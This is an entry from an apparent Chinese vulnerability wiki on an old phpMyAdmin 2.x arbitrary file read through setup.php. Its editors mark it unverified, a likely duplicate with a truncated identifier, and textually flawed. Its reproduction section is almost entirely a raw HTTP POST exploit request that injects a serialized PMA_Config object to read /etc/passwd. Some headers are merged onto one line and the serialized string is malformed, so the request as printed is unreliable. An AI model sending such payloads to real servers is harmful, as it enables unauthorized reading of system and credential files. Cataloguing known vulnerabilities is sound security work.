---
source: "hatch 补库批 20260928"
title: "（WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞"
product: "phpMyAdmin"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "disputed"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "phpMyAdmin 2.x 旧 setup.php 可访问；未描述鉴权"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-33eb2b397eba1a7dd58835a3"
entity_id: "ve-33eb2b397eba1a7dd58835a3"
schema_version: "1"
---

# （WooYun-2016-1994）Phpmyadmin 任意文件读取漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：phpMyAdmin 2.x 旧 setup.php 可访问；未描述鉴权
- 证据范围：请求与75相同而标题 WooYun-2016-1994 疑为截断编号，无独立原理或证据

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 需核实截断的 WooYun 编号后关联199433，不能当独立漏洞
- 多个 HTTP 头合并在一行且缺少正文分隔空行
- 序列化字符串 source 后逗号错误与75一致

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

一、漏洞简介
------------

二、漏洞影响
------------

phpMyAdmin2.x 版本

三、复现过程
------------

    POST /scripts/setup.php HTTP/1.1 
    Host: www.0-sec.org:8080
    Accept-Encoding: gzip, deflate Accept: */*
    Accept-Language: en
    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trid ent/5.0)
    Connection: close
    Content-Type: application/x-www-form-urlencoded Content-Length: 80
    action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
